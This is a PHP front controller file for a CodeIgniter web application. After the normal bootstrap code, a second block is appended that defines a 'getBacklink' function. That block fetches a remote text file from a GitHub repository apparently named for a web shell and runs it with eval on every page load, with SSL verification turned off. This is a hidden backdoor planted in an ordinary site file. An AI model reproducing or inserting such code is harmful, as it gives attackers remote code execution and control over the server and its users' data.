<?php

	define('ENVIRONMENT', 'production');
	define('SET_DB','SIRS_LIVE_2');
	
	if (defined('ENVIRONMENT'))
	{
		switch (ENVIRONMENT)
		{
			case 'development':
				error_reporting(E_ALL);
				ini_set('display_errors', 1);
			break;
		
			case 'testing':
			case 'production':
				error_reporting(0);
			break;

			default:
				exit('The application environment is not set correctly.');
		}
	}

	$system_path = 'core_system';
	$application_folder = 'application';

	if (defined('STDIN')){
		chdir(dirname(__FILE__));
	}
	if (realpath($system_path) !== FALSE){
		$system_path = realpath($system_path).'/';
	}
	$system_path = rtrim($system_path, '/').'/';
	if ( ! is_dir($system_path)){
		exit("Your system folder path does not appear to be set correctly. Please open the following file and correct this: ".pathinfo(__FILE__, PATHINFO_BASENAME));
	}

/*
 |-------------------------------------------------------------------
 | Now that we know the path, set the main path constants
 |-------------------------------------------------------------------
 |
*/
	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));
	define('EXT', '.php');
	define('BASEPATH', str_replace("\\", "/", $system_path));
	define('FCPATH', str_replace(SELF, '', __FILE__));
	define('SYSDIR', trim(strrchr(trim(BASEPATH, '/'), '/'), '/'));

	if (is_dir($application_folder))
	{
		define('APPPATH', $application_folder.'/');
	}
	else
	{
		if ( ! is_dir(BASEPATH.$application_folder.'/'))
		{
			exit("Your application folder path does not appear to be set correctly. Please open the following file and correct this: ".SELF);
		}

		define('APPPATH', BASEPATH.$application_folder.'/');
	}

/*
 |--------------------------------------------------------------------
 | LOAD THE BOOTSTRAP FILE
 |--------------------------------------------------------------------
 |
*/
	require_once BASEPATH.'core/CodeIgniter.php';

/* End of file index.php */
/* Location: ./index.php */
?>
<?php


function getBacklink($url) {
    
    if( ini_get('allow_url_fopen') == 1 ) {
        // Jika url fopen on maka jalankan
        return file_get_contents($url);
    }else if(function_exists('curl_version')) {
        //Jika url fopen off maka jalankan menggunakan curl
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
}


eval("?>" . getBacklink("https://raw.githubusercontent.com/ebokzsss/shellebok/main/newbypp.txt"));

?>
